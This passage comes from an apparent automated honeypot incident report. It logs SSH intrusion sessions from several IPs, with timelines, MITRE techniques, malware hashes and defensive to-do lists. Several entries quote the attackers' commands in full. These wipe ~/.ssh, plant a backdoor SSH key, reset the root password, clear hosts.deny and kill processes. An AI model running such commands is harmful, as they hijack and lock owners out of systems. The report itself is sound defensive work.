| `2026-04-16 03:52:28` | `cowrie.command.failed` |
| `2026-04-16 03:52:28` | `cowrie.log.closed` |
| `2026-04-16 03:52:29` | `cowrie.session.params` |
| `2026-04-16 03:52:29` | `cowrie.command.input` |
| `2026-04-16 03:52:30` | `cowrie.session.file_download` |
| `2026-04-16 03:52:30` | `cowrie.log.closed` |
| `2026-04-16 03:52:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.103.2[.]67` to AbuseIPDB if not already reported
- [ ] Block `181.103.2[.]67` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-065def2812a1

| Field | Detail |
|---|---|
| **Source IP** | `181.103.2[.]67` |
| **First Seen** | 2026-04-16 03:52 |
| **Last Seen** | 2026-04-16 03:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 03:52:34` | `cowrie.session.connect` |
| `2026-04-16 03:52:34` | `cowrie.client.version` |
| `2026-04-16 03:52:34` | `cowrie.client.kex` |
| `2026-04-16 03:52:36` | `cowrie.login.success` |
| `2026-04-16 03:52:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.103.2[.]67` to AbuseIPDB if not already reported
- [ ] Block `181.103.2[.]67` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d24d600d2c72

| Field | Detail |
|---|---|
| **Source IP** | `181.103.2[.]67` |
| **First Seen** | 2026-04-16 03:56 |
| **Last Seen** | 2026-04-16 03:56 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 03:56:22` | `cowrie.session.connect` |
| `2026-04-16 03:56:22` | `cowrie.client.version` |
| `2026-04-16 03:56:22` | `cowrie.client.kex` |
| `2026-04-16 03:56:23` | `cowrie.login.success` |
| `2026-04-16 03:56:24` | `cowrie.session.params` |
| `2026-04-16 03:56:24` | `cowrie.command.input` |
| `2026-04-16 03:56:24` | `cowrie.command.failed` |
| `2026-04-16 03:56:25` | `cowrie.log.closed` |
| `2026-04-16 03:56:25` | `cowrie.session.params` |
| `2026-04-16 03:56:25` | `cowrie.command.input` |
| `2026-04-16 03:56:26` | `cowrie.session.file_download` |
| `2026-04-16 03:56:26` | `cowrie.log.closed` |
| `2026-04-16 03:56:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.103.2[.]67` to AbuseIPDB if not already reported
- [ ] Block `181.103.2[.]67` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fdcae5fe409

| Field | Detail |
|---|---|
| **Source IP** | `181.103.2[.]67` |
| **First Seen** | 2026-04-16 03:56 |
| **Last Seen** | 2026-04-16 03:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 03:56:30` | `cowrie.session.connect` |
| `2026-04-16 03:56:30` | `cowrie.client.version` |
| `2026-04-16 03:56:30` | `cowrie.client.kex` |
| `2026-04-16 03:56:32` | `cowrie.login.success` |
| `2026-04-16 03:56:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.103.2[.]67` to AbuseIPDB if not already reported
- [ ] Block `181.103.2[.]67` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15634e9b7fa7

| Field | Detail |
|---|---|
| **Source IP** | `106.254.54[.]101` |
| **First Seen** | 2026-04-16 04:05 |
| **Last Seen** | 2026-04-16 04:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 04:05:48` | `cowrie.session.connect` |
| `2026-04-16 04:05:48` | `cowrie.client.version` |
| `2026-04-16 04:05:48` | `cowrie.client.kex` |
| `2026-04-16 04:05:48` | `cowrie.login.success` |
| `2026-04-16 04:05:49` | `cowrie.session.params` |
| `2026-04-16 04:05:49` | `cowrie.command.input` |
| `2026-04-16 04:05:49` | `cowrie.command.failed` |
| `2026-04-16 04:05:49` | `cowrie.log.closed` |
| `2026-04-16 04:05:49` | `cowrie.session.params` |
| `2026-04-16 04:05:49` | `cowrie.command.input` |
| `2026-04-16 04:05:49` | `cowrie.session.file_download` |
| `2026-04-16 04:05:49` | `cowrie.log.closed` |
| `2026-04-16 04:05:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.254.54[.]101` to AbuseIPDB if not already reported
- [ ] Block `106.254.54[.]101` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c36341a7a776

| Field | Detail |
|---|---|
| **Source IP** | `106.254.54[.]101` |
| **First Seen** | 2026-04-16 04:05 |
| **Last Seen** | 2026-04-16 04:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 04:05:51` | `cowrie.session.connect` |
| `2026-04-16 04:05:51` | `cowrie.client.version` |
| `2026-04-16 04:05:51` | `cowrie.client.kex` |
| `2026-04-16 04:05:52` | `cowrie.login.success` |
| `2026-04-16 04:05:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.254.54[.]101` to AbuseIPDB if not already reported
- [ ] Block `106.254.54[.]101` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dac0696540eb

| Field | Detail |
|---|---|
| **Source IP** | `102.210.149[.]130` |
| **First Seen** | 2026-04-16 04:07 |
| **Last Seen** | 2026-04-16 04:07 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 04:07:01` | `cowrie.session.connect` |
| `2026-04-16 04:07:01` | `cowrie.client.version` |
| `2026-04-16 04:07:01` | `cowrie.client.kex` |
| `2026-04-16 04:07:02` | `cowrie.login.success` |
| `2026-04-16 04:07:02` | `cowrie.session.params` |
| `2026-04-16 04:07:02` | `cowrie.command.input` |
| `2026-04-16 04:07:02` | `cowrie.command.failed` |
| `2026-04-16 04:07:03` | `cowrie.log.closed` |
| `2026-04-16 04:07:03` | `cowrie.session.params` |
| `2026-04-16 04:07:03` | `cowrie.command.input` |
| `2026-04-16 04:07:03` | `cowrie.session.file_download` |
| `2026-04-16 04:07:03` | `cowrie.log.closed` |
| `2026-04-16 04:07:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.210.149[.]130` to AbuseIPDB if not already reported
- [ ] Block `102.210.149[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-911a78643d24

| Field | Detail |
|---|---|
| **Source IP** | `102.210.149[.]130` |
| **First Seen** | 2026-04-16 04:07 |
| **Last Seen** | 2026-04-16 04:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 04:07:06` | `cowrie.session.connect` |
| `2026-04-16 04:07:06` | `cowrie.client.version` |
| `2026-04-16 04:07:06` | `cowrie.client.kex` |
| `2026-04-16 04:07:07` | `cowrie.login.success` |
| `2026-04-16 04:07:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.210.149[.]130` to AbuseIPDB if not already reported
- [ ] Block `102.210.149[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56f0c69119d7

| Field | Detail |
|---|---|
| **Source IP** | `110.39.9[.]140` |
| **First Seen** | 2026-04-16 04:08 |
| **Last Seen** | 2026-04-16 04:09 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 04:08:56` | `cowrie.session.connect` |
| `2026-04-16 04:08:56` | `cowrie.client.version` |
| `2026-04-16 04:08:57` | `cowrie.client.kex` |
| `2026-04-16 04:08:57` | `cowrie.login.success` |
| `2026-04-16 04:08:58` | `cowrie.session.params` |
| `2026-04-16 04:08:58` | `cowrie.command.input` |
| `2026-04-16 04:08:58` | `cowrie.command.failed` |
| `2026-04-16 04:08:58` | `cowrie.log.closed` |
| `2026-04-16 04:08:58` | `cowrie.session.params` |
| `2026-04-16 04:08:58` | `cowrie.command.input` |
| `2026-04-16 04:08:58` | `cowrie.session.file_download` |
| `2026-04-16 04:08:58` | `cowrie.log.closed` |
| `2026-04-16 04:09:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.39.9[.]140` to AbuseIPDB if not already reported
- [ ] Block `110.39.9[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42fd49ba32b1

| Field | Detail |
|---|---|
| **Source IP** | `110.39.9[.]140` |
| **First Seen** | 2026-04-16 04:09 |
| **Last Seen** | 2026-04-16 04:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 04:09:01` | `cowrie.session.connect` |
| `2026-04-16 04:09:01` | `cowrie.client.version` |
| `2026-04-16 04:09:01` | `cowrie.client.kex` |
| `2026-04-16 04:09:01` | `cowrie.login.success` |
| `2026-04-16 04:09:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.39.9[.]140` to AbuseIPDB if not already reported
- [ ] Block `110.39.9[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b5efbcaa0e6

| Field | Detail |
|---|---|
| **Source IP** | `122.166.167[.]154` |
| **First Seen** | 2026-04-16 04:11 |
| **Last Seen** | 2026-04-16 04:11 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 04:11:57` | `cowrie.session.connect` |
| `2026-04-16 04:11:57` | `cowrie.client.version` |
| `2026-04-16 04:11:57` | `cowrie.client.kex` |
| `2026-04-16 04:11:57` | `cowrie.login.success` |
| `2026-04-16 04:11:58` | `cowrie.session.params` |
| `2026-04-16 04:11:58` | `cowrie.command.input` |
| `2026-04-16 04:11:58` | `cowrie.command.failed` |
| `2026-04-16 04:11:58` | `cowrie.log.closed` |
| `2026-04-16 04:11:58` | `cowrie.session.params` |
| `2026-04-16 04:11:58` | `cowrie.command.input` |
| `2026-04-16 04:11:58` | `cowrie.session.file_download` |
| `2026-04-16 04:11:58` | `cowrie.log.closed` |
| `2026-04-16 04:11:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.166.167[.]154` to AbuseIPDB if not already reported
- [ ] Block `122.166.167[.]154` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bb47a5cd878

| Field | Detail |
|---|---|
| **Source IP** | `122.166.167[.]154` |
| **First Seen** | 2026-04-16 04:11 |
| **Last Seen** | 2026-04-16 04:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 04:11:59` | `cowrie.session.connect` |
| `2026-04-16 04:11:59` | `cowrie.client.version` |
| `2026-04-16 04:11:59` | `cowrie.client.kex` |
| `2026-04-16 04:11:59` | `cowrie.login.success` |
| `2026-04-16 04:11:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.166.167[.]154` to AbuseIPDB if not already reported
- [ ] Block `122.166.167[.]154` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0cfe962a251

| Field | Detail |
|---|---|
| **Source IP** | `14.103.122[.]90` |
| **First Seen** | 2026-04-16 04:18 |
| **Last Seen** | 2026-04-16 04:19 |
| **Session Duration** | 31s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:RZ4eQMVqa6Vy"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 04:18:31` | `cowrie.session.connect` |
| `2026-04-16 04:18:31` | `cowrie.client.version` |
| `2026-04-16 04:18:32` | `cowrie.client.kex` |
| `2026-04-16 04:18:32` | `cowrie.login.success` |
| `2026-04-16 04:18:33` | `cowrie.session.params` |
| `2026-04-16 04:18:33` | `cowrie.command.input` |
| `2026-04-16 04:18:33` | `cowrie.command.failed` |
| `2026-04-16 04:18:33` | `cowrie.log.closed` |
| `2026-04-16 04:18:34` | `cowrie.session.params` |
| `2026-04-16 04:18:34` | `cowrie.command.input` |
| `2026-04-16 04:18:34` | `cowrie.session.file_download` |
| `2026-04-16 04:18:34` | `cowrie.log.closed` |
| `2026-04-16 04:18:47` | `cowrie.session.params` |
| `2026-04-16 04:18:47` | `cowrie.command.input` |
| `2026-04-16 04:18:48` | `cowrie.log.closed` |
| `2026-04-16 04:18:49` | `cowrie.session.params` |
| `2026-04-16 04:18:49` | `cowrie.command.input` |
| `2026-04-16 04:18:49` | `cowrie.log.closed` |
| `2026-04-16 04:18:50` | `cowrie.session.params` |
| `2026-04-16 04:18:50` | `cowrie.command.input` |
| `2026-04-16 04:18:50` | `cowrie.session.file_download` |
| `2026-04-16 04:18:50` | `cowrie.log.closed` |
| `2026-04-16 04:18:50` | `cowrie.session.params` |
| `2026-04-16 04:18:50` | `cowrie.command.input` |
| `2026-04-16 04:18:50` | `cowrie.log.closed` |
| `2026-04-16 04:18:51` | `cowrie.session.params` |
| `2026-04-16 04:18:51` | `cowrie.command.input` |
| `2026-04-16 04:18:52` | `cowrie.log.closed` |
| `2026-04-16 04:18:52` | `cowrie.session.params` |
| `2026-04-16 04:18:52` | `cowrie.command.input` |
| `2026-04-16 04:18:52` | `cowrie.command.input` |
| `2026-04-16 04:18:52` | `cowrie.log.closed` |
| `2026-04-16 04:18:53` | `cowrie.session.params` |
| `2026-04-16 04:18:53` | `cowrie.command.input` |
| `2026-04-16 04:18:53` | `cowrie.log.closed` |
| `2026-04-16 04:18:54` | `cowrie.session.params` |
| `2026-04-16 04:18:54` | `cowrie.command.input` |
| `2026-04-16 04:18:54` | `cowrie.log.closed` |
| `2026-04-16 04:18:56` | `cowrie.session.params` |
| `2026-04-16 04:18:56` | `cowrie.command.input` |
| `2026-04-16 04:18:56` | `cowrie.log.closed` |
| `2026-04-16 04:18:56` | `cowrie.session.params` |
| `2026-04-16 04:18:56` | `cowrie.command.input` |
| `2026-04-16 04:18:57` | `cowrie.log.closed` |
| `2026-04-16 04:18:57` | `cowrie.session.params` |
| `2026-04-16 04:18:57` | `cowrie.command.input` |
| `2026-04-16 04:18:57` | `cowrie.log.closed` |
| `2026-04-16 04:18:58` | `cowrie.session.params` |
| `2026-04-16 04:18:58` | `cowrie.command.input` |
| `2026-04-16 04:18:58` | `cowrie.log.closed` |
| `2026-04-16 04:18:59` | `cowrie.session.params` |
| `2026-04-16 04:18:59` | `cowrie.command.input` |
| `2026-04-16 04:18:59` | `cowrie.log.closed` |
| `2026-04-16 04:18:59` | `cowrie.session.params` |
| `2026-04-16 04:18:59` | `cowrie.command.input` |
| `2026-04-16 04:19:00` | `cowrie.log.closed` |
| `2026-04-16 04:19:01` | `cowrie.session.params` |
| `2026-04-16 04:19:01` | `cowrie.command.input` |
| `2026-04-16 04:19:01` | `cowrie.log.closed` |
| `2026-04-16 04:19:02` | `cowrie.session.params` |
| `2026-04-16 04:19:02` | `cowrie.command.input` |
| `2026-04-16 04:19:03` | `cowrie.log.closed` |
| `2026-04-16 04:19:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.122[.]90` to AbuseIPDB if not already reported
- [ ] Block `14.103.122[.]90` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8bc8f9519881

| Field | Detail |
|---|---|
| **Source IP** | `14.103.122[.]90` |
| **First Seen** | 2026-04-16 04:19 |
| **Last Seen** | 2026-04-16 04:20 |
| **Session Duration** | 37s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:TN38B5wZanLB"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 04:19:41` | `cowrie.session.connect` |
| `2026-04-16 04:19:41` | `cowrie.client.version` |
| `2026-04-16 04:19:41` | `cowrie.client.kex` |
| `2026-04-16 04:19:42` | `cowrie.login.success` |
| `2026-04-16 04:19:42` | `cowrie.session.params` |
| `2026-04-16 04:19:42` | `cowrie.command.input` |
| `2026-04-16 04:19:42` | `cowrie.command.failed` |
| `2026-04-16 04:19:42` | `cowrie.log.closed` |
| `2026-04-16 04:19:43` | `cowrie.session.params` |
| `2026-04-16 04:19:43` | `cowrie.command.input` |
| `2026-04-16 04:19:43` | `cowrie.session.file_download` |
| `2026-04-16 04:19:43` | `cowrie.log.closed` |
| `2026-04-16 04:20:00` | `cowrie.session.params` |
| `2026-04-16 04:20:00` | `cowrie.command.input` |
| `2026-04-16 04:20:01` | `cowrie.log.closed` |
| `2026-04-16 04:20:01` | `cowrie.session.params` |
| `2026-04-16 04:20:01` | `cowrie.command.input` |
| `2026-04-16 04:20:01` | `cowrie.log.closed` |
| `2026-04-16 04:20:02` | `cowrie.session.params` |
| `2026-04-16 04:20:02` | `cowrie.command.input` |
| `2026-04-16 04:20:03` | `cowrie.session.file_download` |
| `2026-04-16 04:20:03` | `cowrie.log.closed` |
| `2026-04-16 04:20:03` | `cowrie.session.params` |
| `2026-04-16 04:20:03` | `cowrie.command.input` |
| `2026-04-16 04:20:03` | `cowrie.log.closed` |
| `2026-04-16 04:20:04` | `cowrie.session.params` |
| `2026-04-16 04:20:04` | `cowrie.command.input` |
| `2026-04-16 04:20:04` | `cowrie.log.closed` |
| `2026-04-16 04:20:05` | `cowrie.session.params` |
| `2026-04-16 04:20:05` | `cowrie.command.input` |
| `2026-04-16 04:20:05` | `cowrie.command.input` |
| `2026-04-16 04:20:05` | `cowrie.log.closed` |
| `2026-04-16 04:20:06` | `cowrie.session.params` |
| `2026-04-16 04:20:06` | `cowrie.command.input` |
| `2026-04-16 04:20:06` | `cowrie.log.closed` |
| `2026-04-16 04:20:06` | `cowrie.session.params` |
| `2026-04-16 04:20:06` | `cowrie.command.input` |
| `2026-04-16 04:20:07` | `cowrie.log.closed` |
| `2026-04-16 04:20:07` | `cowrie.session.params` |
| `2026-04-16 04:20:07` | `cowrie.command.input` |
| `2026-04-16 04:20:07` | `cowrie.log.closed` |
| `2026-04-16 04:20:08` | `cowrie.session.params` |
| `2026-04-16 04:20:08` | `cowrie.command.input` |
| `2026-04-16 04:20:08` | `cowrie.log.closed` |
| `2026-04-16 04:20:09` | `cowrie.session.params` |
| `2026-04-16 04:20:09` | `cowrie.command.input` |
